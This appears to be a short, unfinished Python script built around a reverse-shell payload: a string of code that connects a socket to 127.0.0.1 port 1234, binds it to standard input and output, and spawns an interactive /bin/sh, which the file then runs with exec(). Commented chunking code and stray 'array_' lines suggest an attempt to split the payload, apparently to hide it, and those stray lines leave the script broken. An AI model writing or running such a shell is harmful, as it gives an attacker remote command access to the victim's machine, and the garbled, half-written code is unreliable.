import re

template_reverse_shell = """
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
"""
n = 2
# [array_1[i:i+n] for i in range(0,len(template_reverse_shell),n)]
# array_1[2]="imp"
array_2
array_2
array_3
array_4
array_5

# def chop():
    # return 

exec(template_reverse_shell)